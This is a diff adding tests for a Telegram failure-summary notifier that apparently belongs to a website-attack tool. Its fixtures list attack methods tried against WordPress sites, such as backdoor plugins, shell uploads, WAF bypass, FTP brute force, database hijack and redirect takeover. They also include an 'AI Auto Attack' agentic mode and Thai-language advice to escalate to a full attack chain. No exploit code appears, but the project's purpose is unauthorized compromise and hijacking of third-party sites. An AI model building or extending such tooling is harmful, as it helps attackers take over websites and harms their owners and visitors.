@@ -199,3 +199,138 @@ describe("Attack Success Alert Notifications", () => {
     expect(typeof result).toBe("boolean");
   });
 });
+
+import { sendFailureSummaryAlert, type FailureSummaryData, type MethodAttempt } from "./telegram-notifier";
+
+describe("Failure Summary Alert Notifications", () => {
+  it("should export sendFailureSummaryAlert function", () => {
+    expect(typeof sendFailureSummaryAlert).toBe("function");
+  });
+
+  it("should accept FailureSummaryData with full details", async () => {
+    const data: FailureSummaryData = {
+      domain: "hardened-site.com",
+      mode: "full_chain",
+      totalDurationMs: 600000,
+      methods: [
+        { name: "Unified Attack Pipeline", status: "timeout", reason: "⏰ Timeout (180s)", durationMs: 180000 },
+        { name: "Cloaking Inject", status: "failed", reason: "403 Forbidden" },
+        { name: "Hijack Redirect", status: "failed", reason: "0/6 methods succeeded" },
+        { name: "MU-Plugins Backdoor", status: "failed", reason: "wp-content not writable" },
+        { name: "DB Hijack", status: "error", reason: "Connection refused" },
+        { name: "GTM Inject", status: "failed", reason: "No GTM container found" },
+        { name: "auto_prepend", status: "failed", reason: ".user.ini not writable" },
+        { name: "Redirect Takeover", status: "failed", reason: "All methods blocked by WAF" },
+        { name: "AI Auto Attack", status: "timeout", reason: "⏰ Timeout (480s)", durationMs: 480000 },
+      ],
+      serverInfo: "nginx/1.18 (Cloudflare)",
+      cms: "WordPress 6.4",
+      vulnCount: 3,
+    };
+
+    expect(data.domain).toBe("hardened-site.com");
+    expect(data.mode).toBe("full_chain");
+    expect(data.methods.length).toBe(9);
+    expect(data.methods.filter(m => m.status === "timeout").length).toBe(2);
+    expect(data.methods.filter(m => m.status === "failed").length).toBe(6);
+    expect(data.methods.filter(m => m.status === "error").length).toBe(1);
+
+    const result = await sendFailureSummaryAlert(data);
+    expect(typeof result).toBe("boolean");
+  });
+
+  it("should handle minimal failure data", async () => {
+    const data: FailureSummaryData = {
+      domain: "minimal-fail.com",
+      mode: "redirect_only",
+      methods: [
+        { name: "htaccess_write", status: "failed", reason: "403 Forbidden" },
+      ],
+    };
+
+    expect(data.methods.length).toBe(1);
+
+    const result = await sendFailureSummaryAlert(data);
+    expect(typeof result).toBe("boolean");
+  });
+
+  it("should handle pipeline failure with many methods", async () => {
+    const data: FailureSummaryData = {
+      domain: "https://pipeline-fail.com",
+      mode: "pipeline",
+      totalDurationMs: 300000,
+      methods: [
+        { name: "Shell Upload", status: "failed", reason: "8 ครั้ง, 5 shells", durationMs: 120000 },
+        { name: "WAF Bypass", status: "failed", reason: "3 วิธีลอง" },
+        { name: "Alt Upload", status: "failed", reason: "2 วิธีลอง" },
+        { name: "Indirect Attack", status: "failed", reason: "1 วิธีลอง" },
+        { name: "DNS Attack", status: "failed", reason: "2 วิธีลอง" },
+        { name: "Config Exploit", status: "failed", reason: "3 วิธีลอง" },
+        { name: "Shellless Attack", status: "failed", reason: "4 วิธีลอง" },
+        { name: "AI Commander", status: "failed", reason: "5 iterations", durationMs: 60000 },
+      ],
+      serverInfo: "Apache/2.4.41",
+      cms: "WordPress 6.2",
+      vulnCount: 5,
+    };
+
+    expect(data.methods.length).toBe(8);
+
+    const result = await sendFailureSummaryAlert(data);
+    expect(typeof result).toBe("boolean");
+  });
+
+  it("should handle agentic_auto failure", async () => {
+    const data: FailureSummaryData = {
+      domain: "agentic-fail.com",
+      mode: "agentic_auto",
+      totalDurationMs: 180000,
+      methods: [
+        { name: "AI Auto Attack (Session #42)", status: "failed", reason: "ลอง 5 เป้าหมาย ไม่สำเร็จ" },
+      ],
+    };
+
+    expect(data.mode).toBe("agentic_auto");
+
+    const result = await sendFailureSummaryAlert(data);
+    expect(typeof result).toBe("boolean");
+  });
+
+  it("should handle custom recommendations", async () => {
+    const data: FailureSummaryData = {
+      domain: "custom-rec.com",
+      mode: "hijack_redirect",
+      totalDurationMs: 120000,
+      methods: [
+        { name: "FTP Brute", status: "failed", reason: "Connection refused" },
+        { name: "MySQL Inject", status: "timeout", reason: "หมดเวลา (5min)", durationMs: 300000 },
+        { name: "PMA Access", status: "skipped", reason: "Port 8080 closed" },
+      ],
+      recommendations: [
+        "ลองใช้ full_chain เพื่อโจมตีเต็มรูปแบบ",
+        "เว็บนี้มี Cloudflare WAF — ลอง AI Auto Attack",
+        "ตรวจสอบ FTP port ด้วย /scan",
+      ],
+    };
+
+    expect(data.recommendations?.length).toBe(3);
+    expect(data.methods.filter(m => m.status === "skipped").length).toBe(1);
+
+    const result = await sendFailureSummaryAlert(data);
+    expect(typeof result).toBe("boolean");
+  });
+
+  it("should handle MethodAttempt type correctly", () => {
+    const attempt: MethodAttempt = {
+      name: "test_method",
+      status: "failed",
+      reason: "test reason",
+      durationMs: 5000,
+    };
+
+    expect(attempt.name).toBe("test_method");
+    expect(attempt.status).toBe("failed");
+    expect(attempt.reason).toBe("test reason");
+    expect(attempt.durationMs).toBe(5000);
+  });
+});
